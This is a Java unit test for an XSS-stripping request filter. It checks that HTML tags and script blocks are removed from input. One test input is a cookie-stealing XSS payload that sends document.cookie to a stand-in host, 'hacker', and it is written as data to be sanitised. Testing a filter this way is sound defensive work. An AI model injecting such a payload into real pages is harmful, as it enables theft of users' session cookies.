package com.siliconmtn.io.api.security;

import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;

import javax.servlet.FilterChain;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;

import org.apache.commons.io.IOUtils;
// Junit 5
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

public class XSSFilterTest {
	
	/**
	 * Ensure that the filter can run without throwing any errors
	 * @throws Exception
	 */
	@Test
	public void testXSSFilter() throws Exception {
		
		XSSFilter xss = new XSSFilter();

        HttpServletRequest request = mock(HttpServletRequest.class);
        XSSRequestWrapper wrappedRequest = mock(XSSRequestWrapper.class);
        ServletResponse response = mock(ServletResponse.class);
        FilterChain chain = mock(FilterChain.class);
        
        
        String test = "<span>test</span>";
        Reader inputString = new StringReader(test);
        BufferedReader reader = new BufferedReader(inputString);
        
        when(request.getReader()).thenReturn(reader);
        when(wrappedRequest.getReader()).thenReturn(reader);

        xss.doFilter(request, response, chain);
        
	}
	
	/**
	 * Check the actual stripXSS functionality, checking to see if it removes html tags,
	 * entire script tags, 
	 * @throws Exception
	 */
	@Test
	public void testXSSStripping() throws Exception {

        assert(XSSRequestWrapper.stripXSS("<span>test</span>").equals("test"));
        assert(XSSRequestWrapper.stripXSS("<p>Your search for 'flowers <script>evil_script()</script>").equals("Your search for 'flowers"));
        assert(XSSRequestWrapper.stripXSS( "<SCRIPT>var+img=new+Image(); img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>").equals(""));
        
	}
	
}
